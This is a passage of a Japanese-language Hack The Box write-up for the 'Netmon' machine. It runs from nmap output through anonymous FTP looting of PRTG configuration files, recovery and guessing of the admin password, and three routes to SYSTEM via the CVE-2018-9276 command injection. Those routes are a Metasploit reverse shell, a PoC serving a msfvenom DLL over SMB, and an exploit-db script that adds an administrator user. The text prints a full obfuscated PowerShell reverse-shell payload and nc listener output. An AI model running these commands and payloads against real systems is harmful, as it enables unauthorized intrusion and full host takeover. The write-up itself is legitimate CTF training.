\xE0\xA4\xB8\xE0\xA5\x81\xE0\xA4\xB0\xE0\xA4\x95\xE0\xA5\x8D\xE0\xA4\xB7\xE0\xA4\xBE, \xE0\xA4\x86\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\xAE \xE0\xA4\x94\xE0\xA4\xB0 \xE0\xA4\x87\xE0\xA4\xB8 \xE0\xA4\xB8\xE0\xA4\xBE\xE0\xA4\x87\xE0\xA4\x9F \xE0\xA4\xAA\xE0\xA4\xB0 \xE0\xA4\xB8\xE0\xA4\xAC\xE0\xA4\xB8\xE0\xA5\x87 \xE0\xA4\x85\xE0\xA4\x9A\xE0\xA5\x8D\xE0\xA4\x9B\xE0\xA4\xBE \xE0\xA4\x85\xE0\xA4\xA8\xE0\xA5\x81\xE0\xA4\xAD\xE0\xA4\xB5 \xE0\xA4\x95\xE0\xA4\xB0\xE0\xA4\xA8\xE0\xA5\x87 \xE0\xA4\xB2\xE0\xA4\xBF\xE0\xA4\x8F \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA5\x87 \xE0\xA4\xAC\xE0\xA5\x8D\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\x89\xE0\xA4\x9C\xE0\xA4\xBC\xE0\xA4\xB0 \xE0\xA4\x95\xE0\xA5\x8B \xE0\xA4\x85\xE0\xA4\xAA\xE0\xA4\xA1\xE0\xA5\x87\xE0\xA4\x9F \xE0\xA4\x95\xE0\xA4\xB0\xE0\xA5\x87\xE0\xA4\x82</a>\xE0\xA5\xA4';\x0D
|     t.sk = 'Chceli by sme V\xC3\xA1m pripomen\xC3\xBA\xC5\xA5: V\xC3\xA1\xC5\xA1 prehliada\xC4\x8D (%s) je <b>zastaral\xC3\xBD</b>. <a%s>Aktualizujte si ho</a> pre viac bezpe\xC4\x8Dnosti, pohodlia a pre ten najlep\xC5\xA1\xC3\xAD z\xC3\xA1\xC5\xBEitok na tejto str\xC3\xA1nke.';\x0D
|     t.vi = 'Website n\xC3\xA0y xin nh\xE1\xBA\xAFc b\xE1\xBA\xA1n r\xE1\xBA\xB1ng: Tr\xC3\xACnh duy\xE1\xBB\x87t (%s) c\xE1\xBB\xA7a b\xE1\xBA\xA1n hi\xE1\xBB\x87n \xC4\x91\xC3\xA3 <b>l\xE1\xBB\x97i th\xE1\xBB\x9Di</b>. <a%s>H\xC3\xA3y c\xE1\xBA\xADp nh\xE1\xBA\xADt tr\xC3\xACnh duy\xE1\xBB\x87t c\xE1\xBB\xA7a b\xE1\xBA\xA1n</a> \xC4\x91\xE1\xBB\x83 t\xC4\x83ng th\xC3\xAAm t\xC3\xADnh b\xE1\xBA\xA3o m\xE1\xBA\xADt, s\xE1\xBB\xB1 ti\xE1\xBB\x87n l\xE1\xBB\xA3i v\xC3\xA0 tr\xE1\xBA\xA3i nghi\xE1\xBB\x87m tuy\xE1\xBB\x87t nh\xE1\xBA\xA5t tr\xC3\xAAn trang web n\xC3\xA0y.';\x0D
| \x0D
|     var text = t[ll] || t.en;\x0D
|     text = busprintf(text, bb.t, ' class="update arrow" href="//www.google.com/chrome" target="_blank"' ,' style="display:none"');\x0D
|     var div = document.createElement('div');\x0D
|     div.className = "browsercheck js-adjustToMenu";\x0D
|     div.innerHTML = '<div class="browsercheck_inner">' +\x0D
|                         '<button title="'+_Prtg.Lang.Dialogs.strings.close+'" class="browsercheck-ignore glyph-cancel-1"></button>' +\x0D
|                         '<p>' + text + '</p>' +\x0D
|                     '</div>';\x0D
|     document.body.insertBefore(div, document.body.firstChild);\x0D
|     document.getElementsByClassName("browsercheck-ignore")[0].onclick = function(){\x0D
|       !!localStorage && localStorage.setItem("browsercheck", false);\x0D
|       div.style ="display:none"\x0D
|     };\x0D
|     !!localStorage && localStorage.setItem("browsercheck", JSON.stringify({l:ll,b:bb}));\x0D
|   }\x0D
| \x0D
|   function busprintf() {\x0D
|     var args = arguments;\x0D
|     var data = args[0];\x0D
|     for (var k = 1; k <args.length; ++k)\x0D
|       data = data.replace(/%s/, args[k]);\x0D
|     return data;\x0D
|   }\x0D
|   function getURLParameter(name) {\x0D
|     return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;\x0D
|   }\x0D
|   //test add browsercheck = {"l":"en","b":{"n":"c","v":10,"t":"Chrome 10","donotnotify":false,"mobile":false}} to localStrorage\x0D
|   //or add browser=ABCD.12 to the URL\x0D
|   var test = getURLParameter('browser');\x0D
|   if(!!test)\x0D
|     localStorage.removeItem("browsercheck")\x0D
|   $buo({mobile: false}, test);\x0D
| \x0D
| })(window, document);\x0D
| \x0D
| \x0D
|   function byId(id) {\x0D
|     return document.getElementById(id);\x0D
|   }\x0D
| \x0D
| \x0D
|   if(!document.addEventListener) {\x0D
|       document.getElementById("unsupportedbrowser").style.display = "block";\x0D
|     }\x0D
|   else {\x0D
|       document.addEventListener("DOMContentLoaded", function(event) {\x0D
|       var mobile = false;\x0D
|       var unofficiallysupported=false;\x0D
|       var unsupportedbrowser=false;\x0D
| \x0D
|     // OK, this code runs, we have least Javascript in this browser\x0D
|         byId("loginusername").addEventListener('keydown',function(event){\x0D
|           byId("loginpassword").type = "password";\x0D
|     },{once:true})\x0D
|     // Clear the session storage cache (debugging only)\x0D
|     !!window.sessionStorage&&window.sessionStorage.clear();\x0D
| \x0D
|     unsupportedbrowser = true;\x0D
|     if (unsupportedbrowser) {\x0D
|       byId("unsupportedbrowser").style.display="block";\x0D
|       return;\x0D
|     }\x0D
| \x0D
|     if (window.location.host=="localhost") {\x0D
|         byId("dontuselocalhost").style.display="block";\x0D
|       }\x0D
|     });\x0D
|   }\x0D
| </script>\x0D
| <!--\x0D
| //        You can use this file to modify the appearance of the PRTG web interface\x0D
| //        as described in https://kb.paessler.com/en/topic/33\x0D
| //        \x0D
| //        Please note that you are using an unsupported and deprecated feature. \x0D
| //        Your changes will be broken or removed with future PRTG updates.\x0D
| //        \x0D
| //        If you modify this file, PLEASE LET US KNOW what you're changing and why!\x0D
| //        Just drop an email to support@paessler.com and help us understand your \x0D
| //        needs. Thank you!       \x0D
| -->\x0D
| \x0D
| </body>\x0D
|_</html>
| http-enum: 
|   /icons/ecblank.gif: Lotus Domino
|   /icons/ecblank.gif: Lotus Domino
|   /icons/icon_set_up_2701XX_01.gif: 2WIRE 2701HG
|   /icons/icon_homeportal_2701XX.gif: 2WIRE 2701HG
|_  /api/: Potentially interesting folder (401 Unauthorized)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.230.176
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.230.176:80/
|     Form id: loginform
|     Form action: /public/checklogin.htm
|     
|     Path: http://10.129.230.176:80/public/forgotpassword.htm
|     Form id: loginform
|     Form action: /public/sendpassword.htm
|     
|     Path: http://10.129.230.176:80/public/checklogin.htm
|     Form id: loginform
|     Form action: /public/checklogin.htm
|     
|     Path: http://10.129.230.176:80/downloads.htm
|     Form id: loginform
|_    Form action: /public/checklogin.htm
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Host script results:
|_smb-vuln-ms10-061: No accounts left to try
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 1578.07 seconds
```


## STEP 2
ftpでファイル探索  
ユーザフラグはゲット！  
ルートフラグは権限不足で確認できず
```sh
└─$ ftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> dir
229 Entering Extended Passive Mode (|||56852|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.


ftp> cd Users
250 CWD command successful.


ftp> dir
229 Entering Extended Passive Mode (|||56853|)
150 Opening ASCII mode data connection.
02-25-19  11:44PM       <DIR>          Administrator
04-17-25  10:19AM       <DIR>          Public
226 Transfer complete.


ftp> more Public\\Desktop\\user.txt
c5a3c0462ce87b64857fbbff23d35c55


ftp> cd Administrator
550 Access is denied.
```


## STEP 3
80番にアクセス  
https://www.paessler.com/ <- ネットワーク監視系のやつらしい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Netmon_01.png" width="100%" height="100%">  
PRTG Network Monitor の脆弱性を探すと複数発見、３番目が対応している  
[CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)に該当し、Webコンソール画面からOSコマンドインジェクションできるらしい。  
この脆弱性をエクスプロイトするためにクレデンシャルが必要なので探す
```sh
msf6 > search prtg

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce_cve_2023_32781  2023-08-09       excellent  Yes    PRTG CVE-2023-32781 Authenticated RCE
   1    \_ target: Windows_Fetch                                  .                .          .      .
   2    \_ target: Windows_CMDStager                              .                .          .      .
   3  exploit/windows/http/prtg_authenticated_rce                 2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE
```
[公式サイト](https://www.paessler.com/manuals/prtg/login#:~:text=When%20you%20log%20in%20for,should%20change%20the%20default%20password.)のデフォルトクレデンシャルではログインできず  
[このサイト](https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved)から、パスワードはどうやら「configuration.dat」に保存されている（暗号化されて要るっぽい）と判明  
[このサイト](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)から、「%programdata%\Paessler\PRTG Network Monitor\configuration.dat」にあると推測  
ftpで取得する、「C:\ProgramData」は隠しフォルダなのでFTP上では一見表示されないが確認できる
```sh
└─$ ftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> dir
229 Entering Extended Passive Mode (|||57352|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.


ftp> cd "programdata\\paessler\\PRTG Network Monitor"
250 CWD command successful.


ftp> dir
229 Entering Extended Passive Mode (|||57366|)
150 Opening ASCII mode data connection.
04-17-25  10:55AM       <DIR>          Configuration Auto-Backups
04-17-25  08:00PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-17-25  10:21AM       <DIR>          Logs (Web Server)
04-17-25  08:00PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-17-25  10:06PM              1732349 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.


ftp> binary 
200 Type set to I.


ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
229 Entering Extended Passive Mode (|||57460|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1161 KiB   26.83 KiB/s    00:00 ETA
226 Transfer complete.
1189697 bytes received in 00:43 (26.67 KiB/s)
```
パスワードぽいもの発見、やっぱり暗号化されている
```xml
<login>
   prtgadmin
 </login>
 <name>
   PRTG System Administrator
 </name>
 <ownerid>
   100
 </ownerid>
 <password>
   <flags>
     <encrypted/>
   </flags>
   <cell col="0" crypt="PRTG">
     JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
   </cell>
   <cell col="1" crypt="PRTG">
     OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
   </cell>
 </password>
```
同フォルダ内にバックアップファイルものがあったのでダウンロード
```sh
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||59224|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1126 KiB   20.86 KiB/s    00:00 ETA
226 Transfer complete.
1153755 bytes received in 00:54 (20.76 KiB/s)
```
あらあら平文のクレデンシャル発見
```xml
<dbpassword>
 <!-- User: prtgadmin -->
 PrTg@dmin2018
</dbpassword>
```
このクレデンシャルでWebログインしたが失敗  
ここでこのクレデンシャルは2018年に作成されたコンフィグのバックアップファイル  
現在のコンフィグは2019年に作成なので、「PrTg@dmin2018」でなく「PrTg@dmin2019」と推測ができたりできなかったり  
実際に「PrTg@dmin2019」でログインすると成功した！（このパスワード推測CTFっぽいね）
```sh
└─$ ls -l 'PRTG Configuration.dat' 'PRTG Configuration.old.bak' 
-rw-rw-r-- 1 kali kali 1189697 Feb 25  2019 'PRTG Configuration.dat'
-rw-rw-r-- 1 kali kali 1153755 Jul 14  2018 'PRTG Configuration.old.bak'
```


# SOLUTION 1
USE METASPLOIT
## STEP4
`metasploit`を使用してエクスプロイト、フラグゲット！
```sh
msf6 > search prtg

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce_cve_2023_32781  2023-08-09       excellent  Yes    PRTG CVE-2023-32781 Authenticated RCE
   1    \_ target: Windows_Fetch                                  .                .          .      .
   2    \_ target: Windows_CMDStager                              .                .          .      .
   3  exploit/windows/http/prtg_authenticated_rce                 2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/prtg_authenticated_rce

msf6 > use 3
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/prtg_authenticated_rce) > options

Module options (exploit/windows/http/prtg_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   ADMIN_PASSWORD  prtgadmin        yes       The password for the specified username
   ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                            no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.137.100  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_PASSWORD PrTg@dmin2019
ADMIN_PASSWORD => PrTg@dmin2019

msf6 exploit(windows/http/prtg_authenticated_rce) > set RHOSTS 10.129.17.67
RHOSTS => 10.129.17.67

msf6 exploit(windows/http/prtg_authenticated_rce) > set LHOST tun0
LHOST => 10.10.16.5

msf6 exploit(windows/http/prtg_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.16.5:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (177734 bytes) to 10.129.17.67
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.129.17.67:59472) at 2025-04-18 01:48:01 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2025-04-17 10:13:29 -0400

meterpreter > cat 'c:\Users\Administrator\Desktop\root.txt'
74857cea503cf62366e036300f64b6c8
```


# SOLUTION 2
NO METASPLOIT
## STEP 4
### PoC1
面白いPoCを発見  
PoCの仕組みは、`msfvenom`でリバースシェルのDLLを作成し、`impacket-smbserver`でDLLをアップロード  
CVE-2018-9276のOSコマンドインジェクションでDLLをrundllで実行させ、リバースシェル取得
```sh
└─$ wget https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
--2025-04-18 02:21:32--  https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
Connecting to 192.168.20.37:8080... connected.
Proxy request sent, awaiting response... 200 OK
Length: 16049 (16K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]  15.67K  --.-KB/s    in 0.001s  

2025-04-18 02:21:33 (18.0 MB/s) - ‘exploit.py’ saved [16049/16049]

                                                                                                                                                                                                                                            
└─$ python3.13 exploit.py                                                                                                          
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
usage: exploit.py [-h] -i HOST -p PORT --lhost LHOST --lport LPORT [--user USER] [--password PASSWORD] [--https]
exploit.py: error: the following arguments are required: -i/--host, -p/--port, --lhost, --lport
                                                                                                                                                                                                                                            

└─$ python3.13 exploit.py -i 10.129.17.67 -p 80 --lhost 10.10.16.5 --lport 4444 --user "prtgadmin" --password "PrTg@dmin2019"
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.129.17.67:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.16.5 LPORT=4444 OUTPUT=/tmp/bkdpccjp.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/htb/exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/htb/exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.16.5\IUGMYMBK]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.16.5:4444 for the reverse shell!]
listening on [any] 4444 ...
[*] Incoming connection (10.129.17.67,59854)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
connect to [10.10.16.5] from (UNKNOWN) [10.129.17.67] 59867
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system


C:\Windows\system32>exit
[*] Disconnecting Share(2:IUGMYMBK)
exit
[*] Closing down connection (10.129.17.67,59854)
[*] Remaining connections []
```
### PoC2
`searchsploiot`でも面白そうなPoCを発見  
こいつの仕組みは、Cookieを使用してCVE-2018-9276のOSコマンドインジェクションで管理者ユーザを作成する  
そのあとは、自分でPsexecをするなどしてターゲットのシェルを取得するかんじ
```sh
└─$ searchsploit prtg
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                                                                      | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                                                                     | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                                                                                  | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                                                                   | java/webapps/34108.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            

└─$ searchsploit -m 46527
  Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46527
     Path: /usr/share/exploitdb/exploits/windows/webapps/46527.sh
    Codes: CVE-2018-9276
 Verified: False
File Type: Bourne-Again shell script, ASCII text executable, with very long lines (2429)
Copied to: /home/kali/46527.sh


└─$ ./46527.sh 

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```
ブラウザでログインした際のCookieをSniffing
```sh
└─$ tshark -i tun0 -f 'tcp dst port 80' -Y http.cookie -T fields -e http.cookie
Capturing on 'tun0'
_ga=GA1.4.392899000.1745059567; _gid=GA1.4.172396290.1745059567; OCTOPUS1813713946=ezkyQ0M5OUUwLUNCQ0UtNEZENS04RkI1LTcwMjRCNjdBNjI0NX0%3D
```
実行、無事管理者ユーザ作成成功
```sh
└─$ ./46527.sh -u http://10.129.230.176 -c "_ga=GA1.4.392899000.1745059567; _gid=GA1.4.172396290.1745059567; OCTOPUS1813713946=ezkyQ0M5OUUwLUNCQ0UtNEZENS04RkI1LTcwMjRCNjdBNjI0NX0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                                                                        

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
```
今回はPsexecがうまく刺さった
```sh
└─$ impacket-psexec 'pentest:P3nT3st!@10.129.230.176'                                                                                                                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.230.176.....
[*] Found writable share ADMIN$
[*] Uploading file hMYkZSUd.exe
[*] Opening SVCManager on 10.129.230.176.....
[*] Creating service kqqS on 10.129.230.176.....
[*] Starting service kqqS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
### PoC3
OSコマンドインジェクションの該当部分は、通知が送信された際に実行されるプログラムのパラメータになる  
セミコロンの後の文字列がコマンドとして実行されてしまう
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Netmon_02.png" width="100%" height="100%">  
msfvenomで作成したPowershellリバースシェルを上図のように貼り付ける、通知をテストで送信できるので実行すると
```sh
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=tun0 LPORT=4444       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1883 bytes
A�8�u�LLE9�u�XD�@$I�fA�H�P�H▒D�@ I��VH��A�4�H�M1�H1��A��
                       HD�@I�A��H�AXAX^YZAXAYAZH�� AR��XAYZH��W���]H�H��A�1�o��ջ���VA�������H��(<|
���u�GrojYA����powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIALHyBGgCA5VVXW/jNhB8969YGGojIRLhBAcUDZBDXV2uC{1'+'}C7M05p82AY'+'CE2tYzU06Z{1}UbCPxfy8pUR+OE7QnG{1}bIXQ6Hs0NyUQpmCingDzT{1}Hc4ZL1AYGDwPwD7BhsElfMVN8m3+NzIDye1ujV/pCm2nITY/rfKbZPKnxk+4oCU3qcLcRgrKtYUIjCqxzZooud2RVxm2v9fT5A72g0VDcS03qGzLsoMqPqGKrsL6e5oZVYiHWZDK1YqKPD7szTRnUrzq/CQ3gkuaV72Rx1SSodbgBVj{1}vOToCP4WRlCn{2}AsIm2kgwX9gOC9EPoyqYD2u'+'GssLbVCgsoOn2c5+r4hTLZPsEY0mt2x94zNmH+xzP{1}BoQ5Vx8/qZq6gv0WUvb8wYro0{2}'+'rMsR1lT279{2}V+IRK4zHj{2}rpX8reYpxM/0fBsRNzvA/nl12HsVuGnHtTyaaOQrhzXGppYm2VVn+XYsa'+'urU5NzThn6YvSoac2zBuwddshKVZgdyZrU0M8fBwtrKYzD5+DWou8hoRqmB2O+40oaT{2}GZYlEwavAvyoucOt+llPM5Z'+'Y+zKHqDDhmXZulM6waN9Zu6BKLkPB4ars/Oh55MH6sV'+'qVtkX'+'8XpfGdwOps{2}7u2sOCLkfGSfl5+eR3svNIq8CYdTg1tDUDCZO59fXIyz9Po6cuL/7nL'+'C4Z01rNxomLgtlS2Rc1ClEDYbrDSltqYdwikEK{1}4uXEu4LX9q+2yV2'+'gCTq3VpuuC9SOV6p4qHpYEwjeBLwZTUcmEglWotVaUmgbGbzCVpUGixnzAn9+{1}eeDt6OcidrQuG3cLiUdw1yA2KB7Pse6jZzH0XHZnox1Sans7gxkI6WfxBQ{2}qeP861GfVZqivKlpZzDQq{2}aA+aLquj7Z7w4HyOSLPa+ihrkKKXa/EkHzG52q6tttrq3aLs+5baLAuOYRgUlevqRXxHmoe1x2IYxRAcsI8gEQijI0mvnH6Y31ot37sq/B51KaTS+Mpr3qHYnUYdlR6aPyqq1TWiQlBEr6ppN6Yr5tG6IWmOvBr8/OPPZ/AC30qT1KjgzXMAdQ6VIA3wKZxMMjix70r/'+'G8kqD0dkQs3SRT/CSQeydUQCVEqq6W'+'h2M{2}mPdRUnjCNVYfQWg8t+w2617eDYwP/Lvx3Mfzq2b9gjvzZjPvNSL9tb0B88/lxPudTo11Ntx+Zu6humu7AyI9fNLeX/rTPbC76tnb+'+'p/gVauNSBpggAAA{0}{0}')-f'=','J','F')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```
エラーは出たが、無事リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.79] from (UNKNOWN) [10.129.230.176] 56266
Windows PowerShell running as user NETMON$ on NETMON
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Windows\system32> Test-Path : Cannot bind argument to parameter 'Path' because it is an empty 
string.
At C:\Program Files (x86)\PRTG Network Monitor\Notifications\exe\Demo EXE 
Notification - OutFile.ps1:30 char:17
+   if (Test-Path $Path)
+                 ~~~~~
    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingVa 
   lidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorEmptyStringNotAl 
   lowed,Microsoft.PowerShell.Commands.TestPathCommand

PS C:\Windows\system32> whoami
nt authority\system
```
